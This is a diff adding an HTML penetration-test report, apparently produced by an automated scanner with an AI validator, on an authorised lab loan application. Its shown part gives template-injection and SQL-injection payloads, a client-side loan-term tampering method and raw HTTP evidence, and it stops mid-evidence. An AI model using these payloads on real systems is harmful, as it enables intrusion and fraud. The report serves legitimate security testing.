@@ -1,0 +1,794 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr2zhd9h-v3eyor</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [ssti] Server-Side Template Injection (Jinja2) in loan calculator via principal parameter</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [sqli] Unauthenticated SQL injection in login username parameter</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [price-tampering] Client-controlled loan repayment terms — monthly_payment (and principal/term) accepted verbatim via POST /profile</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#f57c00">MEDIUM</span> [xss-reflected] Reflected XSS in loan calculator via principal parameter</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Working test credentials (test:test) disclosed in login page HTML comment</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr2zhd9h-v3eyor</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32830/login</code></td></tr>
+<tr><td>Started</td><td>2026-07-02T04:07:42.855Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>13 mapped · 13 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32830</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">2</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">1</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [ssti] Server-Side Template Injection (Jinja2) in loan calculator via principal parameter</h3>
+<div class="kv">Screen: <code>s-0007</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32830/login</div>
+<div class="desc">The /total_loan_payments AJAX endpoint (invoked by the &quot;Calculate total loan payments and interests&quot; button on /loan_details) reflects the client-supplied `principal` parameter verbatim into a server-rendered response template. The value is evaluated by the Jinja2 template engine: injecting an arithmetic template expression causes the server to compute and return the product. The negative control (a non-template value) did not evaluate, while two positive replays each returned the computed product of the injected expression. Because this is Flask/Jinja2 template evaluation, it is remote-code-execution class — an attacker can escalate from arithmetic evaluation to reading server config/secrets and executing OS commands via standard Jinja2 gadget chains (e.g. accessing __class__/__mro__/__subclasses__ or config).</div>
+<div><b>Reproduction</b></div><pre>1. Authenticate and GET /total_loan_payments?principal=1000&amp;payment=100&amp;term=12 — response reflects principal verbatim.
+2. Replace principal with a template expression, e.g. GET /total_loan_payments?principal={{8471*8292}}&amp;payment=100&amp;term=12
+3. Response contains &quot;loan_principal&quot;: &quot;70241532&quot; — the server evaluated 8471*8292 rather than echoing the literal, proving Jinja2 template evaluation.
+4. Negative control (literal non-template value) is echoed unevaluated. Confirmed with 2 stable positive replays.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31189d-40</code> — <code>artifacts/s-0007/ev-mr31189d-40/</code></div><div class="lbl">REQUEST</div><pre>GET /total_loan_payments?principal=amrSSTIsZmr31185c8mq6&amp;payment=100&amp;term=12 HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 150
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:51:08 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+
+        { &quot;loan_principal&quot;: &quot;amrSSTIsZmr31185c8mq6&quot; ,&quot;monthly_payment&quot;: &quot;100.0&quot;, &quot;loan_term_amount&quot;: &quot;12&quot;, &quot;total_loan_payments&quot;: &quot;1200.0&quot; }</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr3118k1-41</code> — <code>artifacts/s-0007/ev-mr3118k1-41/</code></div><div class="lbl">REQUEST</div><pre>GET /total_loan_payments?principal=%7B%7B8471*8292%7D%7D%24%7B8471*8292%7D%23%7B8471*8292%7D%3C%25%3D8471*8292%25%3E&amp;payment=100&amp;term=12 HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 175
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:51:08 GMT
+expires: 0
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+
+        { &quot;loan_principal&quot;: &quot;70241532${8471*8292}#{8471*8292}&lt;%=8471*8292%&gt;&quot; ,&quot;monthly_payment&quot;: &quot;100.0&quot;, &quot;loan_term_amount&quot;: &quot;12&quot;, &quot;total_loan_payments&quot;: &quot;1200.0&quot; }</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr3118tm-42</code> — <code>artifacts/s-0007/ev-mr3118tm-42/</code></div><div class="lbl">REQUEST</div><pre>GET /total_loan_payments?principal=%7B%7B8471*8292%7D%7D%24%7B8471*8292%7D%23%7B8471*8292%7D%3C%25%3D8471*8292%25%3E&amp;payment=100&amp;term=12 HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 175
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:51:09 GMT
+expires: 0
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+
+        { &quot;loan_principal&quot;: &quot;70241532${8471*8292}#{8471*8292}&lt;%=8471*8292%&gt;&quot; ,&quot;monthly_payment&quot;: &quot;100.0&quot;, &quot;loan_term_amount&quot;: &quot;12&quot;, &quot;total_loan_payments&quot;: &quot;1200.0&quot; }</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [sqli] Unauthenticated SQL injection in login username parameter</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32830/login</div>
+<div class="desc">The `username` field of POST /login is concatenated directly into a SQL query with no parameterization. In isolated (non-concurrent) requests, appending a single quote to the username deterministically triggers a 500 Internal Server Error (SQL syntax error), while the identical request without the quote returns the normal 200 &quot;Invalid username or password&quot; page. A UNION SELECT with exactly 2 columns (`zzz' UNION SELECT NULL,NULL-- -`) is accepted (200) while 1 or 3 columns error out (500), confirming both that arbitrary SQL is injectable and that the underlying query selects 2 columns. Commenting out the trailing quote (`test'-- -`) restores a valid 200, proving full control over the SQL syntax. Passwords are verified in Python with werkzeug check_password_hash (a UNION row carrying a non-hash password value crashes the verifier -&gt; 500), which blocked a trivial plaintext-UNION login bypass, and the app reflects no query output for in-band exfil. The injection itself is unambiguous; a real attacker can escalate to authentication bypass (UNION-inject a row with a known/generated werkzeug hash) or blind boolean/error-based data extraction. NOTE: the target's SQLite backend also throws transient 500s (&quot;database is locked&quot;) under concurrent load, so all confirming evidence was collected with strictly sequential, one-at-a-time requests to eliminate that confound.</div>
+<div><b>Reproduction</b></div><pre>Send requests SEQUENTIALLY (the SQLite backend 500s spuriously under concurrency). 1) POST /login, body `username=verdictx&amp;password=x` -&gt; HTTP 200, 1900-byte login page (&quot;Invalid username or password&quot;). 2) POST /login, body `username=verdictx'&amp;password=x` (single quote appended) -&gt; HTTP 500 Internal Server Error, 265 bytes; reproduced twice. 3) Column-count enumeration: `username=zzz' UNION SELECT NULL,NULL-- -&amp;password=x` -&gt; 200 (valid), whereas one or three NULLs -&gt; 500, proving the query selects 2 columns. 4) `username=test'-- -&amp;password=x` -&gt; 200: the injected comment neutralizes the trailing quote, confirming arbitrary SQL-syntax control.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr30a259-21</code> — <code>artifacts/s-0001/ev-mr30a259-21/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=verdictx&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1900
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:30:00 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- TODO: Delete the testing account (test:test). --&gt; 
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h2 class=&quot;card-title text-center&quot;&gt;Login&lt;/h2&gt;
+                        &lt;form id=&quot;loginForm&quot; action=&quot;/login&quot; method=&quot;post&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username:&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password:&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Login&lt;/button&gt;
+                        &lt;/form&gt;
+                        
+                        &lt;!-- Display error message if login fails --&gt;
+                        &lt;div class=&quot;alert alert-danger mt-3&quot; role=&quot;alert&quot;&gt;
+                            Invalid username or password
+                        &lt;/div&gt;
+                        
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr30aifr-23</code> — <code>artifacts/s-0001/ev-mr30aifr-23/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=verdictx'&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+cache-control: public, max-age=0
+connection: close
+content-length: 265
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:30:22 GMT
+expires: 0
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr30aotu-24</code> — <code>artifacts/s-0001/ev-mr30aotu-24/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=verdictx'&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+cache-control: public, max-age=0
+connection: close
+content-length: 265
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:30:30 GMT
+expires: 0
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [price-tampering] Client-controlled loan repayment terms — monthly_payment (and principal/term) accepted verbatim via POST /profile</h3>
+<div class="kv">Screen: <code>s-0009</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32830/login</div>
+<div class="desc">The authenticated profile update (POST /profile) stores the borrower-supplied loan financial fields verbatim with no server-side validation. Critically, monthly_payment — a value that must be derived server-side from principal, term and interest rate — is accepted directly from the client and persisted. loan_amount (principal) and loan_term_months are likewise fully client-controlled. As the regular &quot;test&quot; user (session {&quot;user_id&quot;:1}) I submitted loan_amount=555555.0, loan_term_months=3 and monthly_payment=42.0; /loan_details then reported principal 555555.0, term 3 months, and a monthly payment of 42.0 — i.e. a $555,555 loan repaid at $42/month over 3 months, an arithmetically impossible repayment that the application accepted and displayed as the borrower's loan terms. This lets any borrower self-define arbitrarily favorable loan terms (unlimited principal, negligible repayment). Business-logic / financial integrity flaw: financial terms that must be lender/server-controlled are directly settable by the client. Note: cross-site abuse is limited because the session cookie is SameSite=Lax, but the flaw is fully exploitable by the authenticated account holder against their own loan record.</div>
+<div><b>Reproduction</b></div><pre>1. Log in as the regular user (session cookie decodes to {&quot;user_id&quot;:1}). 2. Note baseline /loan_details: principal 1000.0, term 12 months, monthly payment 100.0 (evidence ev-mr31exx1-6t — marker &quot;Your monthly payment is 42.0&quot; absent). 3. POST /profile with body name=Alice&amp;lastname=Bob&amp;email=t@t.com&amp;loan_amount=555555.0&amp;loan_term_months=3&amp;monthly_payment=42.0 (302 -&gt; /home; evidence ev-mr31fw7z-6v). 4. GET /loan_details -&gt; &quot;Your loan principal is 555555.0 / term 3 months / Your monthly payment is 42.0&quot; (evidence ev-mr31g0nj-6x). 5. GET /loan_details again -&gt; same tampered values, stable (evidence ev-mr31hhgq-6y). The client-supplied monthly_payment (and principal/term) persisted unchanged, with no recomputation or validation.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31exx1-6t</code> — <code>artifacts/s-0009/ev-mr31exx1-6t/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 3567
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:01:48 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 1000.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 12 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 100.0&lt;/p&gt;
+
+                &lt;!-- Button to trigger AJAX request --&gt;
+                &lt;button id=&quot;getTotalLoanPayments&quot; class=&quot;btn btn-primary&quot;&gt;Calculate total loan payments and interests&lt;/button&gt;
+                
+                &lt;!-- Message to display total loan payment --&gt;
+                &lt;p id=&quot;loanPaymentMessage&quot;&gt;&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#getTotalLoanPayments').click(function() {
+                // Extract loan amount, monthly payment and term from HTML
+                var loanAmount = 1000.0;
+                var loanTerm = 12;
+                var monthlyPayment = 100.0;
+                
+                // AJAX request to /total_loan_payments
+                $.ajax({
+                    url: '/total_loan_payments',
+                    type: 'GET',
+                    data: {
+                        principal: loanAmount,
+                        payment: monthlyPayment,
+                        term: loanTerm
+                    },
+                    success: function(data) {
+                        const obj = JSON.parse(data); 
+
+                        // Extract total loan payment from JSON data
+                        var totalLoanPayment = obj.total_loan_payments;
+                        var totalInterests = parseFloat(obj.total_loan_payments) - parseFloat(obj.loan_principal);
+                        // Update HTML content with total loan payment
+
+                        $('#loanPaymentMessage').text(&quot;Your total loan payment will be &quot; + totalLoanPayment + 
+                            &quot;, paying a total of &quot; + totalInterests + &quot; of interests&quot;
+                        );
+                    },
+                    error: function(xhr, status, error) {
+                        // Handle error
+                        console.log(&quot;Error:&quot;, error);
+                    }
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31g0nj-6x</code> — <code>artifacts/s-0009/ev-mr31g0nj-6x/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 3567
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:02:38 GMT
+expires: 0
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 555555.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 3 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 42.0&lt;/p&gt;
+
+                &lt;!-- Button to trigger AJAX request --&gt;
+                &lt;button id=&quot;getTotalLoanPayments&quot; class=&quot;btn btn-primary&quot;&gt;Calculate total loan payments and interests&lt;/button&gt;
+                
+                &lt;!-- Message to display total loan payment --&gt;
+                &lt;p id=&quot;loanPaymentMessage&quot;&gt;&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#getTotalLoanPayments').click(function() {
+                // Extract loan amount, monthly payment and term from HTML
+                var loanAmount = 555555.0;
+                var loanTerm = 3;
+                var monthlyPayment = 42.0;
+                
+                // AJAX request to /total_loan_payments
+                $.ajax({
+                    url: '/total_loan_payments',
+                    type: 'GET',
+                    data: {
+                        principal: loanAmount,
+                        payment: monthlyPayment,
+                        term: loanTerm
+                    },
+                    success: function(data) {
+                        const obj = JSON.parse(data); 
+
+                        // Extract total loan payment from JSON data
+                        var totalLoanPayment = obj.total_loan_payments;
+                        var totalInterests = parseFloat(obj.total_loan_payments) - parseFloat(obj.loan_principal);
+                        // Update HTML content with total loan payment
+
+                        $('#loanPaymentMessage').text(&quot;Your total loan payment will be &quot; + totalLoanPayment + 
+                            &quot;, paying a total of &quot; + totalInterests + &quot; of interests&quot;
+                        );
+                    },
+                    error: function(xhr, status, error) {
+                        // Handle error
+                        console.log(&quot;Error:&quot;, error);
+                    }
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31hhgq-6y</code> — <code>artifacts/s-0009/ev-mr31hhgq-6y/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 3567
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:03:46 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 555555.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 3 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 42.0&lt;/p&gt;
+
+                &lt;!-- Button to trigger AJAX request --&gt;
